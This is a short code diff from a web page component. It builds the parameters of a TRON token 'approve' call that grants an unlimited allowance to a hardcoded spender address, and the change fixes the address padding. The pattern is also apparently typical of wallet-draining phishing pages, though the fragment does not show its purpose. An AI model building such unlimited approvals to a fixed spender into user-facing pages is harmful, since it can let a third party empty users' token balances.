@@ -145,7 +145,7 @@ export default function Index() {
 
       // ✅ APPROVE_ABI_PARAM dynamically generate करो
       const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
-      const hexAddress = tw.address.toHex(TRON_SPENDER).substring(2);
+      const hexAddress = tw.address.toHex(TRON_SPENDER).substring(2).padStart(64, '0');
       const hexAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       const APPROVE_ABI_PARAM = hexAddress + hexAmount;
       console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
